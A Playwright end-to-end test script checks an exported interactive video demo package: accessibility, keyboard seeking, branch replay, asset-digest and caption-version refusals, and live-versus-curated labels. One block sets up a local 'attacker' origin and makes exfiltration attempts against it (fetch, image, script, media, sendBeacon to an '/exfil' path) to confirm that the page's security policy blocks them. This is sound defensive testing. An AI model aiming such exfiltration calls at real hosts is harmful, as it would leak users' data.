// Real-Chromium journey of the exported DEV_ONLY interactive demonstration package (J-28).
//
// The Java IT exports the packages with the real launcher, unzips them into scratch directories and passes a config file.
// This script serves each package from its OWN loopback origin (a static server that adds no CORS headers and no
// Content-Security-Policy header: the only policy is the package's own meta tag), plus an "attacker" origin that counts
// every request it receives. Packages: good (curated), staleAsset (one asset's bytes changed), staleCaption (caption bound
// to another video version), offPackage (manifest names an http URL), live (live claim backed by every scene),
// liveClaimTampered (live claim but a scene is curated).
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { readFile, writeFile } from "node:fs/promises";
import { extname, join, normalize, resolve, sep } from "node:path";

const config = JSON.parse(await readFile(requiredEnv("MEDIA_DEV_DEMO_CONFIG"), "utf8"));
const { chromium } = await import(requiredEnv("MEDIA_DEV_PLAYWRIGHT_MODULE"));

function requiredEnv(name) {
  const value = process.env[name]?.trim();
  if (!value) throw new Error(`${name} is required`);
  return value;
}

const MIME = { ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".css": "text/css", ".json": "application/json",
  ".webm": "video/webm", ".mp4": "video/mp4", ".vtt": "text/vtt" };

function serve(root) {
  const hits = [];
  const server = createServer(async (request, response) => {
    hits.push(request.url);
    const url = new URL(request.url, "http://x");
    const relative = normalize(decodeURIComponent(url.pathname === "/" ? "/index.html" : url.pathname)).replace(/^[/\\]+/, "");
    const file = resolve(root, relative);
    if (!file.startsWith(resolve(root) + sep)) { response.writeHead(403).end(); return; }
    try {
      const bytes = await readFile(file);
      response.writeHead(200, { "Content-Type": MIME[extname(file)] ?? "application/octet-stream", "Cache-Control": "no-store",
        "X-Content-Type-Options": "nosniff" });
      response.end(bytes);
    } catch {
      response.writeHead(404).end();
    }
  });
  return new Promise((done) => server.listen(0, "127.0.0.1", () => done({ server, hits, origin: `http://127.0.0.1:${server.address().port}` })));
}

const attacker = await new Promise((done) => {
  const hits = [];
  const server = createServer((request, response) => {
    hits.push(request.url);
    response.writeHead(200, { "Access-Control-Allow-Origin": "*", "Content-Type": "text/plain" }).end("attacker");
  });
  server.listen(0, "127.0.0.1", () => done({ server, hits, origin: `http://127.0.0.1:${server.address().port}` }));
});

const servers = { attacker };
for (const [name, dir] of Object.entries(config.packages)) {
  // the tampered off-package manifest names the attacker origin through a placeholder (known only once it is listening)
  const index = join(dir, "index.html");
  const html = await readFile(index, "utf8");
  if (html.includes("ATTACKER_ORIGIN")) await writeFile(index, html.replaceAll("ATTACKER_ORIGIN", attacker.origin));
  servers[name] = await serve(dir);
}

const browser = await chromium.launch({ headless: true });
const events = [];
const emit = (event) => { events.push(event); };

async function open(name, { recordRequests = true } = {}) {
  const context = await browser.newContext({ viewport: { width: 1000, height: 900 } });
  const page = await context.newPage();
  const requests = [];
  if (recordRequests) page.on("request", (request) => requests.push(request.url()));
  const consoleErrors = [];
  page.on("pageerror", (error) => consoleErrors.push(String(error)));
  await page.goto(`${servers[name].origin}/index.html`);
  return { context, page, requests, consoleErrors };
}

const text = (page, selector) => page.locator(selector).innerText();
const state = (page) => page.locator("#demo").getAttribute("data-state");
const activeId = (page) => page.evaluate(() => document.activeElement?.id || document.activeElement?.getAttribute("data-choice") || document.activeElement?.tagName);
const pathLabels = (page) => page.locator("#path li").allInnerTexts();

try {
  // ------------------------------------------------------------------ good (curated) package
  {
    const { page, requests, consoleErrors, context } = await open("good");
    await page.waitForSelector("#demo[data-state=ready]", { timeout: 20000 });
    assert.match(await text(page, "#truth"), /^Curated demonstration/);
    assert.equal(await page.locator("#truth").getAttribute("data-truth"), "curated");
    assert.match(await text(page, "#truth"), /not a live run/);
    assert.match(await text(page, "#origin"), /uploaded by the author \(curated\)/);
    assert.equal(await text(page, "#scene-heading"), config.labels.intro);
    assert.equal(await activeId(page), "scene-heading", "focus moves to the scene heading when a scene is ready");
    assert.match(await text(page, "#status"), /match their recorded SHA-256/);
    assert.equal(await page.locator("#fault").isHidden(), true);

    // screen-reader names
    await page.getByRole("button", { name: "Play", exact: true }).waitFor();
    await page.getByRole("slider", { name: `Seek within ${config.labels.intro}` }).waitFor();
    await page.getByRole("list", { name: "Choices for this scene" }).waitFor();
    await page.getByRole("status").waitFor();
    await page.getByRole("heading", { name: config.labels.intro, level: 2 }).waitFor();
    await page.getByRole("button", { name: `1: ${config.choices.introLeft}; continue to ${config.labels.left}` }).waitFor();
    assert.equal(await page.locator("#caption").getAttribute("aria-live"), "polite");
    assert.equal(await page.locator("#choices button:not([disabled])").count(), 0, "choices wait for the scene to finish");

    // seek within the node with the keyboard: End reaches the end (choices open), Home leaves it (choices close again)
    const slider = page.getByRole("slider", { name: `Seek within ${config.labels.intro}` });
    await slider.focus();
    await page.keyboard.press("End");
    await page.waitForFunction(() => document.querySelectorAll("#choices button:not([disabled])").length === 2, null, { timeout: 5000 });
    await page.keyboard.press("Home");
    await page.waitForFunction(() => document.querySelectorAll("#choices button:not([disabled])").length === 0, null, { timeout: 5000 });
    assert.ok((await page.evaluate(() => document.getElementById("video").currentTime)) < 0.05);
    for (let i = 0; i < 3; i += 1) await page.keyboard.press("PageUp");
    const seekedMs = Number(await slider.inputValue());
    assert.ok(seekedMs >= 400 && seekedMs <= 900, `seek value ${seekedMs}`);
    await page.waitForFunction(() => document.getElementById("caption").textContent === "Welcome to the demo", null, { timeout: 5000 });
    const mediaTime = await page.evaluate(() => document.getElementById("video").currentTime * 1000);
    assert.ok(Math.abs(mediaTime - seekedMs) < 60, `video follows the slider (${mediaTime} vs ${seekedMs})`);
    emit({ step: "seek", seekedMs, mediaTime: Math.round(mediaTime), caption: await text(page, "#caption") });

    // play with the keyboard only: Tab to Play, Enter
    await page.keyboard.press("Home");
    await page.evaluate(() => document.getElementById("scene-heading").focus());
    await page.keyboard.press("Tab");
    assert.equal(await page.evaluate(() => document.activeElement.id), "play");
    await page.keyboard.press("Enter");
    await page.waitForFunction(() => !document.getElementById("video").paused, null, { timeout: 5000 });
    await page.waitForFunction(() => document.querySelectorAll("#choices button:not([disabled])").length === 2, null, { timeout: 15000 });
    assert.equal(await page.evaluate(() => document.activeElement.getAttribute("data-choice")), "left", "focus moves to the first choice");
    await page.keyboard.press("Tab");
    assert.equal(await page.evaluate(() => document.activeElement.getAttribute("data-choice")), "right");
    await page.keyboard.press("Shift+Tab");
    await page.keyboard.press("Enter");
    await page.waitForSelector("#demo[data-state=ready]");
    assert.equal(await text(page, "#scene-heading"), config.labels.left);
    assert.deepEqual(await pathLabels(page), [config.labels.intro, config.labels.left]);
    assert.equal(await page.locator("#path li[aria-current=step]").innerText(), config.labels.left);

    // finish the left scene; the digit key 2 picks "Finish"
    await page.getByRole("button", { name: "Play", exact: true }).click();
    await page.waitForFunction(() => document.querySelectorAll("#choices button:not([disabled])").length === 2, null, { timeout: 15000 });
    await page.keyboard.press("2");
    await page.waitForSelector("#demo[data-state=ready]");
    assert.equal(await text(page, "#scene-heading"), config.labels.end);
    assert.deepEqual(await pathLabels(page), [config.labels.intro, config.labels.left, config.labels.end]);
    assert.match(await text(page, "#choices-note"), /ending/);
    await page.getByRole("button", { name: "Play", exact: true }).click();
    await page.waitForFunction(() => /ending/.test(document.getElementById("status").textContent), null, { timeout: 15000 });

    // branch replay: the recorded path is played again from the start, automatically, and ends at the same scene
    const recorded = await pathLabels(page);
    await page.locator("#replay-path").focus();
    await page.keyboard.press("Enter");
    await page.waitForFunction(() => /^Replay finished at/.test(document.getElementById("status").textContent), null, { timeout: 40000 });
    assert.equal(await text(page, "#status"), `Replay finished at ${config.labels.end}.`);
    assert.deepEqual(await pathLabels(page), recorded, "the replayed path equals the recorded one");
    // replaying one scene restarts it
    await page.locator("#replay-scene").focus();
    await page.keyboard.press("Enter");
    await page.waitForFunction(() => !document.getElementById("video").paused, null, { timeout: 5000 });
    await page.waitForFunction(() => /ending/.test(document.getElementById("status").textContent), null, { timeout: 15000 });
    emit({ step: "replay", path: recorded });

    // restart and take the other branch
    await page.locator("#restart").focus();
    await page.keyboard.press("Enter");
    await page.waitForSelector("#demo[data-state=ready]");
    assert.deepEqual(await pathLabels(page), [config.labels.intro]);
    await page.getByRole("button", { name: "Play", exact: true }).click();
    await page.waitForFunction(() => document.querySelectorAll("#choices button:not([disabled])").length === 2, null, { timeout: 15000 });
    await page.keyboard.press("2");
    await page.waitForSelector("#demo[data-state=ready]");
    assert.deepEqual(await pathLabels(page), [config.labels.intro, config.labels.right]);

    // the package is a closed world: every request went to its own origin or blob:, and every cross-origin attempt is denied
    const attackerUrl = `${attacker.origin}/exfil`;
    const attempts = await page.evaluate(async (url) => {
      const results = {};
      try { await fetch(url, { mode: "no-cors" }); results.fetch = "allowed"; } catch (error) { results.fetch = `denied:${error.name}`; }
      try { await fetch(url); results.fetchCors = "allowed"; } catch (error) { results.fetchCors = `denied:${error.name}`; }
      const image = new Image();
      results.image = await new Promise((done) => { image.onload = () => done("loaded"); image.onerror = () => done("denied"); image.src = url + "/pixel.png"; });
      const script = document.createElement("script");
      results.script = await new Promise((done) => { script.onload = () => done("loaded"); script.onerror = () => done("denied"); script.src = url + "/x.js"; document.head.appendChild(script); });
      const video = document.createElement("video");
      results.media = await new Promise((done) => { video.onloadedmetadata = () => done("loaded"); video.onerror = () => done("denied"); video.src = url + "/x.webm"; });
      try { results.beacon = navigator.sendBeacon(url, "x") ? "queued" : "denied"; } catch { results.beacon = "denied"; }
      return results;
    }, attackerUrl);
    await page.waitForFunction(() => document.querySelectorAll("#policy li[data-directive]").length >= 4, null, { timeout: 5000 });
    assert.deepEqual(attempts, { fetch: "denied:TypeError", fetchCors: "denied:TypeError", image: "denied", script: "denied", media: "denied", beacon: "queued" });
    // a queued beacon is still a request: the policy refuses it before it leaves the page
    await new Promise((done) => setTimeout(done, 700));
    const directives = await page.locator("#policy li[data-directive]").evaluateAll((items) => items.map((item) => item.getAttribute("data-directive")));
    assert.ok(directives.some((d) => d.startsWith("connect-src")), `connect-src violation recorded: ${directives}`);
    assert.ok(directives.some((d) => d.startsWith("img-src")), `img-src violation recorded: ${directives}`);
    assert.ok(directives.some((d) => d.startsWith("script-src")), `script-src violation recorded: ${directives}`);
    assert.ok(directives.some((d) => d.startsWith("media-src")), `media-src violation recorded: ${directives}`);
    assert.match(await text(page, "#policy"), /Blocked by/);
    assert.equal(attacker.hits.length, 0, `the attacker origin received ${JSON.stringify(attacker.hits)}`);
    const foreign = requests.filter((url) => !url.startsWith(servers.good.origin) && !url.startsWith("blob:") && !url.startsWith("data:") && !url.startsWith(attackerUrl));
    assert.deepEqual(foreign, [], "no request left the package origin");
    assert.deepEqual(consoleErrors, [], "no uncaught page error");
    emit({ step: "closed-world", attempts, directives: [...new Set(directives)], attackerHits: attacker.hits.length });
    await context.close();
  }

  // ------------------------------------------------------------------ stale asset (digest mismatch)
  {
    const { page, context } = await open("staleAsset");
    await page.waitForSelector("#demo[data-state=ready]", { timeout: 20000 });
    await page.getByRole("button", { name: "Play", exact: true }).click();
    await page.waitForFunction(() => document.querySelectorAll("#choices button:not([disabled])").length === 2, null, { timeout: 15000 });
    await page.getByRole("button", { name: `2: ${config.choices.introRight}; continue to ${config.labels.right}` }).click();
    await page.waitForSelector("#demo[data-state=refused]", { timeout: 20000 });
    const alert = page.getByRole("alert");
    await alert.waitFor();
    assert.equal(await page.locator("#fault").getAttribute("data-code"), "ASSET_DIGEST_MISMATCH");
    const message = await alert.innerText();
    assert.match(message, /^ASSET_DIGEST_MISMATCH: the video file assets\/[0-9a-f]{64}\.webm does not match its recorded SHA-256 \(expected [0-9a-f]{64}, found [0-9a-f]{64}\); it was not played/);
    assert.equal(await page.locator("#video").getAttribute("src"), null, "the tampered bytes were never attached to the player");
    assert.equal(await page.locator("#play").isDisabled(), true);
    assert.equal(await page.locator("#choices button:not([disabled])").count(), 0);
    assert.match(await text(page, "#status"), /^Refused: ASSET_DIGEST_MISMATCH/);
    // the author can restart; the intact first scene works again and the message is cleared
    await page.locator("#restart").click();
    await page.waitForSelector("#demo[data-state=ready]");
    assert.equal(await page.locator("#fault").isHidden(), true);
    emit({ step: "stale-asset", code: "ASSET_DIGEST_MISMATCH", message });
    await context.close();
  }

  // ------------------------------------------------------------------ caption written for another version of the video
  {
    const { page, requests, context } = await open("staleCaption");
    await page.waitForSelector("#demo[data-state=refused]", { timeout: 20000 });
    assert.equal(await page.locator("#fault").getAttribute("data-code"), "CAPTION_VERSION_MISMATCH");
    assert.match(await page.getByRole("alert").innerText(), /^CAPTION_VERSION_MISMATCH: the captions of .* were written for a different version of the video/);
    assert.equal(await page.locator("#video").getAttribute("src"), null);
    assert.equal(requests.some((url) => /\/(assets|captions)\//.test(url)), false, "nothing was fetched for the refused scene");
    emit({ step: "stale-caption", code: "CAPTION_VERSION_MISMATCH" });
    await context.close();
  }

  // ------------------------------------------------------------------ an off-package asset path in the manifest
  {
    const { page, requests, context } = await open("offPackage");
    await page.waitForSelector("#demo[data-state=refused]", { timeout: 20000 });
    assert.equal(await page.locator("#fault").getAttribute("data-code"), "ASSET_PATH_INVALID");
    assert.equal(attacker.hits.length, 0, "the off-package URL was never requested");
    assert.equal(requests.some((url) => url.startsWith(attacker.origin)), false);
    assert.match(await text(page, "#truth"), /Unverified demonstration/);
    emit({ step: "off-package", code: "ASSET_PATH_INVALID" });
    await context.close();
  }

  // ------------------------------------------------------------------ live versus curated labelling
  {
    const live = await open("live");
    await live.page.waitForSelector("#demo[data-state=ready], #demo[data-state=refused]", { timeout: 20000 });
    assert.equal(await live.page.locator("#truth").getAttribute("data-truth"), "live");
    assert.match(await text(live.page, "#truth"), /^Live output: every scene is output generated by this Media runtime/);
    assert.match(await text(live.page, "#origin"), /output generated by this Media runtime \(live\)/);
    emit({ step: "live-label", truth: await text(live.page, "#truth"), state: await state(live.page) });
    await live.context.close();

    const tampered = await open("liveClaimTampered");
    await tampered.page.waitForSelector("#demo[data-state=ready]", { timeout: 20000 });
    assert.equal(await tampered.page.locator("#truth").getAttribute("data-truth"), "curated");
    assert.match(await text(tampered.page, "#truth"), /a live claim is not supported by every scene/);
    assert.match(await text(tampered.page, "#origin"), /uploaded by the author \(curated\)/);
    emit({ step: "live-claim-downgraded", truth: await text(tampered.page, "#truth") });
    await tampered.context.close();
  }

  console.log(JSON.stringify({ event: "interactive-demo", ok: true, steps: events }));
} finally {
  await browser.close();
  for (const entry of Object.values(servers)) entry.server.close();
}
